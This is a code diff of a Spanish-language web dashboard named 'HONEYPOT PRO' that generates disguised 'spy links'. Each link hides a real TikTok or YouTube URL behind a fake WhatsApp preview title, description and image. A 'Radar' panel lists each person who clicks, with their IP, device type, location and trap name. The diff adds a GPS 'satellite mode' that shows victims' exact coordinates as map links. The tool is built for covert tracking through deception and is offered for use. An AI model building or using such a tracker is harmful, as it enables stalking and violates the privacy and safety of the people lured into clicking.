@@ -9,76 +9,72 @@
     <style>
         :root { --bg: #000000; --card: #1c1c1e; --text: #ffffff; --green: #30d158; --red: #ff453a; --gray: #8e8e93; }
         body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; padding-top: 50px; }
-        
         h1 { font-size: 28px; text-align: center; margin-bottom: 30px; letter-spacing: -0.5px; }
         .status-dot { height: 10px; width: 10px; background-color: var(--green); border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px var(--green); }
-        
-        .card { background-color: var(--card); border-radius: 18px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .label-input { font-size: 11px; color: var(--gray); margin-bottom: 6px; display: block; text-transform: uppercase; letter-spacing: 1px; font-weight: bold; }
-        
-        input { background-color: #2c2c2e; border: none; color: white; padding: 15px; width: 100%; box-sizing: border-box; border-radius: 12px; font-size: 16px; margin-bottom: 15px; outline: none; }
-        input:focus { background-color: #3a3a3c; }
-        
-        .btn { background-color: var(--green); color: black; border: none; padding: 16px; width: 100%; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; margin-top: 5px; transition: transform 0.1s; }
-        .btn:active { transform: scale(0.98); opacity: 0.9; }
-        
-        .log-item { border-bottom: 1px solid #2c2c2e; padding: 12px 0; font-size: 14px; }
-        .log-item:last-child { border-bottom: none; }
-        .log-time { color: var(--gray); font-size: 12px; }
-        .log-ip { color: var(--green); font-family: monospace; font-size: 13px; margin-top: 2px;}
-        .log-loc { font-weight: bold; margin-top: 2px; font-size: 15px; }
-        
-        #link-result { display: none; margin-top: 20px; word-break: break-all; background: #2c2c2e; padding: 15px; border-radius: 12px; font-family: monospace; color: var(--green); font-size: 13px; text-align: center; border: 1px dashed var(--gray); }
-        .device-icon { float: right; font-size: 20px; opacity: 0.8; }
-
-        /* Estilo para el menú avanzado */
+        .card { background-color: var(--card); border-radius: 18px; padding: 20px; margin-bottom: 20px; }
+        .label-input { font-size: 11px; color: var(--gray); margin-bottom: 6px; display: block; text-transform: uppercase; font-weight: bold; }
+        input { background-color: #2c2c2e; border: none; color: white; padding: 15px; width: 100%; box-sizing: border-box; border-radius: 12px; font-size: 15px; margin-bottom: 15px; outline: none; }
+        .btn { background-color: var(--green); color: black; border: none; padding: 16px; width: 100%; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; }
+        #link-result { display: none; margin-top: 20px; word-break: break-all; background: #2c2c2e; padding: 15px; border-radius: 12px; font-family: monospace; color: var(--green); text-align: center; border: 1px dashed var(--gray); }
         .advanced-options { margin-top: 15px; border-top: 1px solid #333; padding-top: 15px; }
         .toggle-adv { color: var(--green); font-size: 14px; text-align: center; cursor: pointer; margin-bottom: 15px; font-weight: bold; text-decoration: underline; }
+        
+        /* SWITCH GPS */
+        .switch-container { display: flex; justify-content: space-between; align-items: center; background: #333; padding: 10px; border-radius: 10px; margin-bottom: 20px; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 28px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--red); } /* Rojo para indicar peligro/gps */
+        input:checked + .slider:before { transform: translateX(22px); }
+        .log-item { border-bottom: 1px solid #2c2c2e; padding: 12px 0; font-size: 14px; }
+        .log-loc { font-weight: bold; margin-top: 2px; font-size: 15px; }
+        .map-link { color: #ffcc00; text-decoration: none; font-weight: bold; display: block; margin-top: 5px; }
     </style>
 </head>
 <body>
-
     <h1><span class="status-dot"></span>HONEYPOT PRO</h1>
 
     <div class="card">
         <h3 style="margin-top:0; margin-bottom:20px;">🕷️ Nueva Trampa</h3>
         
-        <label class="label-input">1. Link Real (Destino)</label>
-        <input type="text" id="urlDestino" placeholder="Pega el link de TikTok / YouTube aquí">
+        <label class="label-input">LINK REAL</label>
+        <input type="text" id="urlDestino" placeholder="Link de TikTok / YouTube">
         
-        <label class="label-input">2. Nombre de Referencia</label>
-        <input type="text" id="nombreTrampa" placeholder="Ej: Video Risa WhatsApp">
+        <label class="label-input">NOMBRE</label>
+        <input type="text" id="nombreTrampa" placeholder="Ej: Caso WhatsApp">
         
-        <div class="toggle-adv" onclick="toggleAdvanced()">⚙️ PERSONALIZAR DISFRAZ (CLICK AQUÍ)</div>
-        
+        <div class="switch-container">
+            <span style="font-weight:bold; font-size:13px;">🛰️ MODO SATÉLITE (GPS)</span>
+            <label class="switch">
+                <input type="checkbox" id="checkGPS">
+                <span class="slider round"></span>
+            </label>
+        </div>
+
+        <div class="toggle-adv" onclick="toggleAdvanced()">⚙️ PERSONALIZAR DISFRAZ</div>
         <div class="advanced-options" id="advOptions" style="display:none;">
-            <label class="label-input">TÍTULO FALSO (WHATSAPP)</label>
+            <label class="label-input">TÍTULO FALSO</label>
             <input type="text" id="metaTitulo" placeholder="Ej: TikTok - @usuario">
-            
             <label class="label-input">DESCRIPCIÓN FALSA</label>
-            <input type="text" id="metaDesc" placeholder="Ej: 745.5K me gusta, 203 comentarios...">
-            
+            <input type="text" id="metaDesc" placeholder="Ej: 745.5K me gusta...">
             <label class="label-input">IMAGEN FALSA (URL)</label>
-            <input type="text" id="metaImg" placeholder="(Opcional) Link de imagen previa">
+            <input type="text" id="metaImg">
         </div>
         
         <button class="btn" onclick="crearTrampa()">GENERAR ENLACE ESPÍA</button>
-        
         <div id="link-result" onclick="copiarLink(this)"></div>
     </div>
 
     <div class="card">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom: 1px solid #2c2c2e; padding-bottom: 10px;">
-            <h3 style="margin:0">📡 Radar en Vivo</h3>
-            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--green); font-size:22px; cursor:pointer;">↻</button>
+            <h3 style="margin:0">📡 Radar</h3>
+            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--green); font-size:22px;">↻</button>
         </div>
-        <div id="logs-container">
-            <div style="text-align:center; color:gray; padding:20px;">Cargando datos...</div>
-        </div>
+        <div id="logs-container"><div style="text-align:center; color:gray;">Cargando...</div></div>
     </div>
 
     <script>
-        // Función para abrir/cerrar menú
         function toggleAdvanced() {
             let div = document.getElementById('advOptions');
             div.style.display = (div.style.display === 'block') ? 'none' : 'block';
@@ -89,65 +85,61 @@
             btn.innerText = "PROCESANDO...";
             
             let payload = {
-                nombre: document.getElementById('nombreTrampa').value || "Link Disfrazado",
+                nombre: document.getElementById('nombreTrampa').value || "Link",
                 url_destino: document.getElementById('urlDestino').value,
+                usar_gps: document.getElementById('checkGPS').checked, // Enviamos estado del GPS
                 meta_titulo: document.getElementById('metaTitulo').value,
                 meta_desc: document.getElementById('metaDesc').value,
                 meta_img: document.getElementById('metaImg').value
             };
             
-            if(!payload.url_destino) { alert("⚠️ Falta el Link"); btn.innerText = "GENERAR ENLACE ESPÍA"; return; }
+            if(!payload.url_destino) { alert("⚠️ Falta Link"); btn.innerText = "GENERAR"; return; }
             if(!payload.url_destino.startsWith('http')) payload.url_destino = 'https://' + payload.url_destino;
 
             try {
                 let res = await fetch('/api/crear_trampa', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(payload)
+                    method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)
                 });
                 let data = await res.json();
-                
-                let div = document.getElementById('link-result');
-                div.style.display = 'block';
-                div.innerText = data.link;
-                
-                btn.innerText = "¡ENLACE CREADO!";
-                alert("✅ Link Generado. Listo para copiar.");
-                
-            } catch(e) { alert("Error servidor"); btn.innerText = "REINTENTAR"; }
+                document.getElementById('link-result').style.display = 'block';
+                document.getElementById('link-result').innerText = data.link;
+                btn.innerText = "¡LISTO!";
+                alert("✅ Link Generado");
+            } catch(e) { alert("Error"); btn.innerText = "REINTENTAR"; }
         }
-
-        function copiarLink(elemento) {
-            navigator.clipboard.writeText(elemento.innerText);
-            alert("📋 ¡Copiado!");
-        }
+        
+        function copiarLink(e) { navigator.clipboard.writeText(e.innerText); alert("Copiado"); }
 
         async function cargarLogs() {
             try {
                 let res = await fetch('/api/ver_ataques');
                 let data = await res.json();
                 let html = "";
-                
-                if(data.length === 0) html = "<div style='text-align:center; padding:30px; color:#444'>💤 Sin actividad reciente</div>";
+                if(data.length === 0) html = "<div style='text-align:center; padding:30px; color:#444'>Sin actividad</div>";
                 
                 data.forEach(log => {
                     let icon = "💻";
                     if(log.dispositivo.includes("iPhone")) icon = " iPhone";
                     else if(log.dispositivo.includes("Android")) icon = "🤖 Android";
-                    else if(log.dispositivo.includes("Windows")) icon = "🪟 PC";
                     
+                    // Si hay GPS exacto, mostramos link a Google Maps
+                    let gpsInfo = "";
+                    if(log.lat && log.lon) {
+                        gpsInfo = `<a href="https://www.google.com/maps?q=${log.lat},${log.lon}" target="_blank" class="map-link">📍 VER UBICACIÓN EXACTA</a>`;
+                    }
+
                     html += `
                     <div class="log-item">
-                        <span class="device-icon">${icon}</span>
+                        <span style="float:right; font-size:20px;">${icon}</span>
                         <div class="log-loc">🌍 ${log.ubicacion}</div>
-                        <div class="log-ip">${log.ip}</div>
-                        <div class="log-time">${log.hora} • 🎯 ${log.trampa}</div>
+                        ${gpsInfo}
+                        <div style="color:var(--green); font-family:monospace; font-size:12px;">${log.ip}</div>
+                        <div style="color:gray; font-size:11px;">${log.hora} • ${log.trampa}</div>
                     </div>`;
                 });
                 document.getElementById('logs-container').innerHTML = html;
             } catch(e) { console.log(e); }
         }
-
         cargarLogs();
     </script>
 </body>
